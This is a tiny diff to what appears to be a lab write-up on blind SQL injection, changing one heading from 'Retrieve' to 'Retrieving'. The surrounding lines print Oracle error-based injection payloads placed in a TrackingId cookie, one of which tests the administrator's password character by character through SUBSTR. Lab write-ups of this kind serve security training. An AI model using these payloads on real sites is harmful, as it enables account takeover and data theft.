@@ -89,7 +89,7 @@ Cookie value: TrackingId=19nxWi7TLGPOQ4bv' || (SELECT CASE WHEN (1=1) THEN TO_CH
 ![](Images/image-21.png)
 ![](Images/image-22.png)
 
-## Retrieve administrator’s password
+## Retrieving administrator’s password
 ```
 Cookie value: TrackingId=19nxWi7TLGPOQ4bv' || (select case when (1=1) then TO_CHAR(1/0) else '' end from users where username='administrator' and SUBSTR(password,1,1)='a') ||'
 ```
